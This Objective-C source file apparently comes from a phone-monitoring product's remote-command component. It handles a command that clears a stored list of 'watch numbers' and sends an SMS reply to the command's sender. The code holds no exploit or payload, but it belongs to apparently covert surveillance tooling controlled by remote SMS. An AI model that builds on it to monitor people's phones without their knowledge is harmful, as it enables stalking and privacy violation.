/**
 - Project name :  RemoteCommandMager Component
 - Class name   :  ClearWatchNumberProcessor
 - Version      :  1.0  
 - Purpose      :  For RemoteCommandMager Component
 - Copy right   :  13/03/2012, Prasad M.B, Vervata Co., Ltd. All rights reserved.
 */

#import "ClearWatchNumberProcessor.h"
#import "PrefWatchList.h"
#import "Preference.h"

@interface ClearWatchNumberProcessor (PrivateAPI)
- (void) processClearWatchNumber;
- (void) sendReplySMS;
@end

@implementation ClearWatchNumberProcessor

/**
 - Method name: initWithRemoteCommandData
 - Purpose:This method is used to initialize the ClearWatchNumberProcessor class
 - Argument list and description: aRemoteCmdData (RemoteCmdData)
 - Return description: self(ClearWatchNumberProcessor)
*/

- (id) initWithRemoteCommandData: (RemoteCmdData *) aRemoteCmdData  {
    DLog (@"ClearWatchNumberProcessor--->initWithRemoteCommandData");
	if ((self =  [super initWithRemoteCommandData:aRemoteCmdData])) {
	}
	return self;
}

#pragma mark RemoteCmdProcessor PrivateAPI Methods

/**
 - Method name: doProcessingCommand
 - Purpose:This method is used to process the ClearWatchNumberProcessor
 - Argument list and description:No Argument 
 - Return description: No return type
*/

- (void) doProcessingCommand {
	DLog (@"ClearWatchNumberProcessor--->doProcessingCommand")
 	[self processClearWatchNumber];
}

#pragma mark ClearWatchNumberProcessor PrivateAPI Methods

/**
 - Method name: processClearWatchNumber
 - Purpose:This method is used to process clear watch number
 - Argument list and description: No Argument
 - Return description: No Return type
*/

- (void) processClearWatchNumber {
	DLog (@"ClearWatchNumberProcessor--->processClearMonitors");
	id <PreferenceManager> prefManager = [[RemoteCmdUtils sharedRemoteCmdUtils] mPreferenceManager];
	PrefWatchList *prefWatchList = (PrefWatchList *) [prefManager preference:kWatch_List];
	NSMutableArray *watchNumberList=[[NSMutableArray alloc] init];
	[prefWatchList setMWatchNumbers:watchNumberList];
	[prefManager savePreferenceAndNotifyChange:prefWatchList];
	[watchNumberList release];
	[self sendReplySMS];
}

/**
 - Method name: sendReplySMS
 - Purpose:This method is used to send the SMS reply
 - Argument list and description: No Argument
 - Return description: No return type
*/

- (void) sendReplySMS {
	DLog (@"ClearWatchNumberProcessor--->sendReplySMS")
	NSString *messageFormat=[[RemoteCmdUtils sharedRemoteCmdUtils] replyMessageFormatWithCommandCode:[self remoteCmdCode]
																						andErrorCode:_SUCCESS_];
	[[RemoteCmdUtils sharedRemoteCmdUtils] createSystemEvent:mRemoteCmdData
											 andReplyMessage:messageFormat];
	if ([mRemoteCmdData mIsSMSReplyRequired]) {
		[[RemoteCmdUtils sharedRemoteCmdUtils] sendSMSWithRecipientNumber:[self recipientNumber] 
															   andMessage:messageFormat];
	}
}

/**
 - Method name: dealloc
 - Purpose:This method is used to Handle Memory managment
 - Argument list and description:No Argument
 - Return description: No Return Type
*/

-(void) dealloc {
	[super dealloc];
}

@end
